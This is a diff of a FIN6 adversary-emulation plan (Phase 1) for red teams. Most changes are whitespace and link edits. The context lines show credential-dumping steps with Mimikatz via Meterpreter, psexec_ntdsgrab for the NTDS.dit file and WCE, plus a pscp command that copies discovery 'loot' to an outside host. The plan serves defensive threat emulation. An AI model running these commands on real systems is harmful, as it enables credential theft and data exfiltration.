@@ -28,7 +28,7 @@ Phase 1 is the pursuit of enabling objectives.  Phase 2, the operational effects
 
 As FIN6 appears to be monetarily motivated, they take a pragmatic approach toward delivery.  FIN6 has employed social engineering ala direct messages on LinkedIn, spear-phished, compromised e-commerce sites, and it has been suggested that they have negotiated or even purchased access to previously compromised networks.<sup>[4](https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html)</sup> <sup>[5](https://exchange.xforce.ibmcloud.com/threat-group/f8409554b71a79792ff099081bc5ac24)</sup> <sup>[7](https://blog.morphisec.com/new-global-attack-on-point-of-sale-systems)</sup> <sup>[8](https://securityintelligence.com/posts/itg08-aka-fin6-partners-with-trickbot-gang-uses-anchor-framework/)</sup> <sup>[11](https://proofpoint.com/us/threat-insight/post/fake-jobs-campaigns-delivering-moreeggs-backdoor-fake-job-offers)</sup> It is therefore, recommended for the purpose of threat emulation, that assessors approach delivery in the same manner.
 
-For teams that intend to emulate the threat actor for every stage of the kill-chain and assess their organization’s ability to protect, as well as detect and respond it may be prudent to approach this step from a red team perspective.  Conduct reconnaissance and choose a method of delivery that has the highest likelihood of successful delivery and exploitation.  For teams that are primarily interested in assessing their organization’s ability to detect and respond to FIN6 activity, it may not be worth the investment of resources.  For these assessors, it is recommended that you assume breach using the C2 framework of your choice.  FIN6 has made use of CobaltStrike and Metasploit.  Koadic C2 may be a good option to emulate the more_eggs implant.  
+For teams that intend to emulate the threat actor for every stage of the kill-chain and assess their organization’s ability to protect, as well as detect and respond it may be prudent to approach this step from a red team perspective.  Conduct reconnaissance and choose a method of delivery that has the highest likelihood of successful delivery and exploitation.  For teams that are primarily interested in assessing their organization’s ability to detect and respond to FIN6 activity, it may not be worth the investment of resources.  For these assessors, it is recommended that you assume breach using the C2 framework of your choice.  FIN6 has made use of CobaltStrike and Metasploit.  Koadic C2 may be a good option to emulate the more_eggs implant.
 
 ---
 
@@ -56,7 +56,7 @@ net user /domain > ad_users.txt
 
 #### 2.2 - Remote System Discovery ([T1018](https://attack.mitre.org/techniques/T1018/))
 
-Identify all computer objects and output the results to a text file. 
+Identify all computer objects and output the results to a text file.
 
 ##### FIN6 Procedure
 
@@ -88,7 +88,7 @@ Get-ADOrganizationalUnit -Filter 'Name -like "*"' | Format-Table Name, Distingui
 
 #### 2.4 - Domain Trust Discovery ([T1482](https://attack.mitre.org/techniques/T1482/))
 
-Performs a full forest search and dumps trust objects to a text file. 
+Performs a full forest search and dumps trust objects to a text file.
 
 ##### FIN6 Procedure
 
@@ -137,9 +137,9 @@ net group /domain > ad_group.txt
 
 ## Step 3 - FIN6 Privilege Escalation
 
-The third objective is to escalate privileges.  Again, in this regard, FIN6 has taken a pragmatic approach.  Reporting suggests the group has purchased credentials, made heavy use of credential access, and used the “getsystem” modules included in publicly available penetration testing frameworks.<sup>[4](https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html)</sup> <sup>[5](https://exchange.xforce.ibmcloud.com/threat-group/f8409554b71a79792ff099081bc5ac24)</sup> <sup>[7](https://blog.morphisec.com/new-global-attack-on-point-of-sale-systems)</sup> FIN6 has been reported to further compromise the Windows domain by copying and exfiltrating the Active Directory database (NTDS.dit) file.<sup>[3](https://www2.fireeye.com/rs/848-DID-242/images/rpt-fin6.pdf)</sup> The information therein enables the group to move freely throughout the domain and pursue their operational objectives.  
+The third objective is to escalate privileges.  Again, in this regard, FIN6 has taken a pragmatic approach.  Reporting suggests the group has purchased credentials, made heavy use of credential access, and used the “getsystem” modules included in publicly available penetration testing frameworks.<sup>[4](https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html)</sup> <sup>[5](https://exchange.xforce.ibmcloud.com/threat-group/f8409554b71a79792ff099081bc5ac24)</sup> <sup>[7](https://blog.morphisec.com/new-global-attack-on-point-of-sale-systems)</sup> FIN6 has been reported to further compromise the Windows domain by copying and exfiltrating the Active Directory database (NTDS.dit) file.<sup>[3](https://www2.fireeye.com/rs/848-DID-242/images/rpt-fin6.pdf)</sup> The information therein enables the group to move freely throughout the domain and pursue their operational objectives.
 
-Privilege escalation can be challenging, it is recommended that you choose your initial target for “compromise” carefully.  In the event that the assessing team is unable to escalate privileges, this event can be “white-carded” with the granting of administrative rights to the compromised account.  This white-carded event could enable the assessing team to escalate via credential access as the procedures described herein require elevated privileges.  
+Privilege escalation can be challenging, it is recommended that you choose your initial target for “compromise” carefully.  In the event that the assessing team is unable to escalate privileges, this event can be “white-carded” with the granting of administrative rights to the compromised account.  This white-carded event could enable the assessing team to escalate via credential access as the procedures described herein require elevated privileges.
 
 ### Procedures
 
@@ -171,7 +171,7 @@ Example: Get-System -ServiceName 'mstdc' -PipeName 'mstdc'
 
 ##### Meterpreter/Mimikatz
 
-Reporting indicates that FIN6 has used Mimikatz on several occasions.<sup>[7](https://blog.morphisec.com/new-global-attack-on-point-of-sale-systems)</sup> <sup>[8](https://securityintelligence.com/posts/itg08-aka-fin6-partners-with-trickbot-gang-uses-anchor-framework/)</sup> <sup>[9](https://securityintelligence.com/posts/more_eggs-anyone-threat-actor-itg08-strikes-again/)</sup> While there are many variations of the tool, FIN6 has to date, favored the use of Metasploit and CobaltStrike for post-exploitation.<sup>[4](https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html)</sup> <sup>[5](https://exchange.xforce.ibmcloud.com/threat-group/f8409554b71a79792ff099081bc5ac24)</sup> <sup>[7](https://blog.morphisec.com/new-global-attack-on-point-of-sale-systems)</sup> <sup>[8](https://securityintelligence.com/posts/itg08-aka-fin6-partners-with-trickbot-gang-uses-anchor-framework/)</sup> <sup>[9](https://securityintelligence.com/posts/more_eggs-anyone-threat-actor-itg08-strikes-again/)</sup>  As such, the recommended procedure specifies using Mimikatz from a Meterpreter session.  This of course, requires a Meterpreter session and elevated privileges.  The commands below load Mimikatz into memory and attempt to retrieve wdigest credentials.  
+Reporting indicates that FIN6 has used Mimikatz on several occasions.<sup>[7](https://blog.morphisec.com/new-global-attack-on-point-of-sale-systems)</sup> <sup>[8](https://securityintelligence.com/posts/itg08-aka-fin6-partners-with-trickbot-gang-uses-anchor-framework/)</sup> <sup>[9](https://securityintelligence.com/posts/more_eggs-anyone-threat-actor-itg08-strikes-again/)</sup> While there are many variations of the tool, FIN6 has to date, favored the use of Metasploit and CobaltStrike for post-exploitation.<sup>[4](https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html)</sup> <sup>[5](https://exchange.xforce.ibmcloud.com/threat-group/f8409554b71a79792ff099081bc5ac24)</sup> <sup>[7](https://blog.morphisec.com/new-global-attack-on-point-of-sale-systems)</sup> <sup>[8](https://securityintelligence.com/posts/itg08-aka-fin6-partners-with-trickbot-gang-uses-anchor-framework/)</sup> <sup>[9](https://securityintelligence.com/posts/more_eggs-anyone-threat-actor-itg08-strikes-again/)</sup>  As such, the recommended procedure specifies using Mimikatz from a Meterpreter session.  This of course, requires a Meterpreter session and elevated privileges.  The commands below load Mimikatz into memory and attempt to retrieve wdigest credentials.
 
 ##### FIN6 Procedure
 
@@ -184,9 +184,9 @@ meterpreter> creds_all
 
 ##### Metasploit ntdsgrab
 
-Another technique reportedly used by FIN6 to achieve credential access and escalate privileges is to copy and exfiltrate the Active Directory NTDS.dit file.<sup>[3](https://www2.fireeye.com/rs/848-DID-242/images/rpt-fin6.pdf)</sup> <sup>[5](https://exchange.xforce.ibmcloud.com/threat-group/f8409554b71a79792ff099081bc5ac24)</sup>  Reporting indicates that on at least one occasion, the group is believed to have used Metasploit's psexec_ntdsgrab module.  This module authenticates to the domain controller, creates a volume shadow copy of the system drive, and downloads copies of the NTDS.dit and SYSTEM hive. Although this technique is herein classified as a privilege escalation technique, the group may execute this module during discovery and exfiltrate the resultant files with the rest of their discovery results.<sup>[5](https://exchange.xforce.ibmcloud.com/threat-group/f8409554b71a79792ff099081bc5ac24)</sup>  
+Another technique reportedly used by FIN6 to achieve credential access and escalate privileges is to copy and exfiltrate the Active Directory NTDS.dit file.<sup>[3](https://www2.fireeye.com/rs/848-DID-242/images/rpt-fin6.pdf)</sup> <sup>[5](https://exchange.xforce.ibmcloud.com/threat-group/f8409554b71a79792ff099081bc5ac24)</sup>  Reporting indicates that on at least one occasion, the group is believed to have used Metasploit's psexec_ntdsgrab module.  This module authenticates to the domain controller, creates a volume shadow copy of the system drive, and downloads copies of the NTDS.dit and SYSTEM hive. Although this technique is herein classified as a privilege escalation technique, the group may execute this module during discovery and exfiltrate the resultant files with the rest of their discovery results.<sup>[5](https://exchange.xforce.ibmcloud.com/threat-group/f8409554b71a79792ff099081bc5ac24)</sup>
 
-Hashes must be retrieved from the NTDS.dit file.  There are a number of openly available tools that are capable of parsing this file, [DSInternals](https://github.com/MichaelGrafnetter/DSInternals) is one such tool.  As this step is done locally and offline, the choice is left to the analyst.  
+Hashes must be retrieved from the NTDS.dit file.  There are a number of openly available tools that are capable of parsing this file, [DSInternals](https://github.com/MichaelGrafnetter/DSInternals) is one such tool.  As this step is done locally and offline, the choice is left to the analyst.
 
 ##### FIN6 Procedure
 
@@ -198,7 +198,7 @@ msf> use auxiliary/admin/smb/psexec_ntdsgrab
 
 ##### Windows Credential Editor
 
-In addition to Mimikatz and psexec_ntdsgrab, FIN6 is reported to use WCE to access credentials.<sup>[3](https://www2.fireeye.com/rs/848-DID-242/images/rpt-fin6.pdf)</sup> <sup>[5](https://exchange.xforce.ibmcloud.com/threat-group/f8409554b71a79792ff099081bc5ac24)</sup>  The command below dumps cleartext passwords stored by the digest authentication package.  
+In addition to Mimikatz and psexec_ntdsgrab, FIN6 is reported to use WCE to access credentials.<sup>[3](https://www2.fireeye.com/rs/848-DID-242/images/rpt-fin6.pdf)</sup> <sup>[5](https://exchange.xforce.ibmcloud.com/threat-group/f8409554b71a79792ff099081bc5ac24)</sup>  The command below dumps cleartext passwords stored by the digest authentication package.
 
 ##### FIN6 Procedure
 
@@ -243,9 +243,17 @@ Example: C:\>plink -ssh root@192.168.101.1
 ```sh
 pscp -P {port} c:\windows\temp\ad_* root@192.168.101.1:/temp/loot
 ```
---- 
 
-## Next Steps
+---
 
-- [FIN6 Operations Flow](/fin6/Operations_Flow.md)
-- [FIN6 Phase 2](/fin6/Emulation_Plan/Phase2.md)
+## Additional Plan Resources
+
+* [Intelligence Summary](/fin6/Intelligence_Summary.md)
+* [Operations Flow](/fin6/Operations_Flow.md)
+* [Emulation Plan](/fin6/Emulation_Plan/README.md)
+  - [Infrastructure](/fin6/Emulation_Plan/Infrastructure.md)
+  - [Phase 1](/fin6/Emulation_Plan/Phase1.md)
+  - [Phase 2](/fin6/Emulation_Plan/Phase2.md)
+  - [YAML](/fin6/Emulation_Plan/yaml)
+* [Issues](https://github.com/center-for-threat-informed-defense/adversary_emulation_library/issues)
+* [Change Log](https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/master/fin6/CHANGE_LOG.md)
